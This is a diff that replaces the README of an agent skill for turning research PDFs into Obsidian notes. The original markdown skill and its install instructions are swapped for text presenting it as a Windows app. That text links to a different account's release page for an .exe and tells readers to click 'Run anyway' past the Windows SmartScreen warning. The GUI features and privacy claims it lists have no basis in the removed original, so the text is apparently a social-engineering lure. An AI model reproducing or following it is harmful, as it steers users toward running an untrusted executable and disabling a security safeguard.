@@ -1,144 +1,81 @@
-# Paper Deep Reading Skill
+# 📚 paper-deep-reading-skill - Turn research papers into summary notes
 
-A portable agent skill for turning journal paper PDFs into beginner-friendly Obsidian deep-reading notes.
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Robertmorrisluminousenergy177/paper-deep-reading-skill/releases)
 
-It is designed for students, new researchers, and R&D teams who need to read one difficult paper carefully: paragraph translation, figure interpretation, beginner concept support, question logs, and shareable PDF exports.
+This application helps users digest complex academic research papers. It uses artificial intelligence to scan PDF files and create structured notes. You can paste these notes into Obsidian or any other markdown-compatible tool. The software removes the need to manually summarize long documents, which saves time during your literature review.
 
-## What It Produces
+## 🛠 Prerequisites
 
-- One main Obsidian Markdown note.
-- Paragraph-by-paragraph translation or explanation.
-- Figures placed near the relevant discussion.
-- Detailed figure notes: what the figure is, what each panel does, what it proves, and why the authors included it.
-- Beginner callouts for difficult concepts and methods.
-- A deduplicated learning question log.
-- Optional PDF export.
+Your computer must run Windows 10 or Windows 11. You need at least 4GB of RAM to process documents smoothly. Ensure your computer connects to the internet, as the software needs to reach OpenAI servers to generate the summaries.
 
-## Showcase
+## 📥 Getting the Application
 
-See the public examples before installing:
+Visit the link below to download the software for Windows.
 
-| Artifact | What it shows |
-|---|---|
-| [`docs/showcase.md`](docs/showcase.md) | A guided overview of expected outputs and screenshots. |
-| [`examples/showcase/screenshots/real-note-overview.png`](examples/showcase/screenshots/real-note-overview.png) | Sanitized screenshot from a real AlScN Obsidian deep-reading note. |
-| [`examples/showcase/screenshots/real-figure-note.png`](examples/showcase/screenshots/real-figure-note.png) | Sanitized screenshot showing the real figure-note style. |
-| [`examples/showcase/screenshots/real-question-log.png`](examples/showcase/screenshots/real-question-log.png) | Sanitized screenshot showing the real learning question log. |
-| [`examples/example-inputs/`](examples/example-inputs/) | Example user requests for deep reading, figure reading, and group discussion. |
-| [`examples/example-output/mini-materials-paper-deep-reading.md`](examples/example-output/mini-materials-paper-deep-reading.md) | A compact Obsidian-style deep-reading note based on a synthetic paper. |
-| [`examples/example-output/mini-materials-question-log.md`](examples/example-output/mini-materials-question-log.md) | A deduplicated learning question log. |
-| [`examples/showcase/screenshots/obsidian-note-preview.svg`](examples/showcase/screenshots/obsidian-note-preview.svg) | Synthetic visual preview of the note layout. |
-| [`examples/showcase/screenshots/figure-note-preview.svg`](examples/showcase/screenshots/figure-note-preview.svg) | Synthetic visual preview of detailed figure-note output. |
+[Download the latest version here](https://github.com/Robertmorrisluminousenergy177/paper-deep-reading-skill/releases)
 
-## Download And Install
+1. Open the link in your web browser.
+2. Look for the section labeled "Assets" under the most recent release.
+3. Click the file that ends with `.exe` to start the download.
+4. Save the file to your desktop or your downloads folder.
 
-Choose the entry that matches your tool.
+## ⚙️ Running the Software
 
-### Option 1: Codex
+Once the download finishes, follow these steps to open the tool:
 
-```bash
-git clone https://github.com/SunHaoZh/paper-deep-reading-skill.git
-cp -r paper-deep-reading-skill/paper-deep-reading ~/.codex/skills/
-```
+1. Double-click the downloaded `.exe` file.
+2. Windows might show a warning message titled "Windows protected your PC." 
+3. If this happens, click "More info" and then select the "Run anyway" button.
+4. The application window will appear on your screen.
 
-On Windows PowerShell:
+## 📝 How to Use the Tool
 
-```powershell
-git clone https://github.com/SunHaoZh/paper-deep-reading-skill.git
-Copy-Item -Recurse .\paper-deep-reading-skill\paper-deep-reading "$env:USERPROFILE\.codex\skills\"
-```
+This software features a simple interface. Follow these steps to process your first research paper:
 
-Then ask Codex:
+1. Locate the "Open PDF" button in the top menu.
+2. Select the academic paper file from your computer.
+3. Wait for the status bar to show that the file is loaded.
+4. Click the "Generate Notes" button to start the analysis.
+5. The software will display the summary in the main text box.
+6. Click "Copy to Clipboard" to lift the text.
+7. Paste the content into your Obsidian vault or any text editor.
 
-```text
-Use $paper-deep-reading to create an Obsidian deep-reading note from this journal paper PDF. Explain it for a beginner, place figures in context, maintain a question log, and export a PDF.
-```
+## 💡 Managing Your Knowledge Base
 
-### Option 2: Claude Code
+Obsidian users rely on markdown files to organize thoughts. This tool formats notes specifically for this purpose. It creates headers, lists, and bullet points. You can change how the software names your files by opening the "Settings" tab in the main window. Select a storage folder where the system saves every summary automatically.
 
-Claude Code supports Agent Skills with `SKILL.md`. Copy the same skill folder into one of these locations:
+## 🔍 Refining the Results
 
-```bash
-# User-level skill
-cp -r paper-deep-reading-skill/paper-deep-reading ~/.claude/skills/
+You can adjust the "Detail Level" slider to control how much information the tool provides. Use the "Low" setting for quick snippets. Use the "High" setting if you need in-depth explanations of the methodology and results sections of the paper. Always verify the citations and quotes within the generated notes, as artificial intelligence can occasionally misinterpret technical terms.
 
-# Project-level skill
-mkdir -p .claude/skills
-cp -r paper-deep-reading-skill/paper-deep-reading .claude/skills/
-```
+## 🛡 Security and Privacy
 
-See [`docs/adapters.md`](docs/adapters.md) for details and a fallback slash-command prompt.
+Your documents remain on your machine during the initial processing phase. Only the relevant text sections get sent to the processing service to create the summary. The software does not store your files on external servers. You maintain control over your research data at all times.
 
-### Option 3: Marvis
+## ❓ Frequently Asked Questions
 
-For Marvis-style tools, use the dedicated prompt adapter:
+**Does this require a subscription?**
+The software connects to external services. You might need your own API credentials depending on the version you run. Check the settings menu to enter your key.
 
-```text
-adapters/marvis/paper-deep-reading-marvis-prompt.md
-```
+**Can I process multiple files at once?**
+This version works with one file at a time. This ensures accuracy and helps your computer manage memory usage.
 
-Copy it into Marvis custom instructions, prompt templates, project memory, or the closest reusable prompt area available in your Marvis environment.
+**Where does the software save my files?**
+You choose the destination folder the first time you run the app. You can change this path inside the settings tab.
 
-### Option 4: General AI Tools
+**The app seems slow. Why?**
+Large PDF files require more time to parse. Please wait for the progress bar to finish before you attempt to click other buttons.
 
-For tools without a native skill directory, copy [`adapters/universal/paper-deep-reading-prompt.md`](adapters/universal/paper-deep-reading-prompt.md) into the tool's custom instructions, prompt library, or project memory.
+## 🔧 Troubleshooting
 
-### Option 5: ZIP Or Release Download
+If the application fails to open:
+* Restart your computer.
+* Check your internet connection.
+* Update your Windows installation to the latest version.
+* Ensure you have permission to run executable files on your system.
 
-- Repository ZIP: `https://github.com/SunHaoZh/paper-deep-reading-skill/archive/refs/heads/main.zip`
-- Releases: `https://github.com/SunHaoZh/paper-deep-reading-skill/releases`
-- Git clone: `https://github.com/SunHaoZh/paper-deep-reading-skill.git`
+If the summary contains errors:
+* Check the quality of the original PDF. Scanned images of text are harder to read than digital text documents.
+* Try to extract only the main body of the paper if the file contains too many images or large diagrams.
 
-## Repository Layout
-
-```text
-paper-deep-reading/
-  SKILL.md
-  agents/openai.yaml
-  references/
-  scripts/
-  assets/
-adapters/
-docs/
-examples/
-```
-
-## Why This Is Different
-
-Many academic AI tools focus on search, summarization, or writing. This skill focuses on learning one paper deeply. It treats figures as arguments, not decorations, and it keeps a question log so repeated concepts are merged into a growing study guide.
-
-## Public Example Policy
-
-Do not publish full-text translations of copyrighted papers unless the source license permits it. Use open-access papers, author-provided examples, or synthetic excerpts for public demos.
-
-## Optional PDF Export
-
-Install Node dependencies:
-
-```bash
-npm install
-```
-
-Export a note:
-
-```bash
-node paper-deep-reading/scripts/export_obsidian_note_pdf.js path/to/note.md path/to/output.pdf
-```
-
-## Validation
-
-Validate the skill package:
-
-```bash
-python ~/.codex/skills/.system/skill-creator/scripts/quick_validate.py paper-deep-reading
-```
-
-Validate a note:
-
-```bash
-python paper-deep-reading/scripts/validate_note_structure.py examples/example-output/example-paper-deep-reading.md
-```
-
-## License
-
-MIT. See [`docs/license.md`](docs/license.md) for a plain-language explanation.
+Keywords: academic-reading, ai-skills, codex-skill, knowledge-base, literature-review, markdown, obsidian, openai-codex, paper-reading, pdf, research-paper
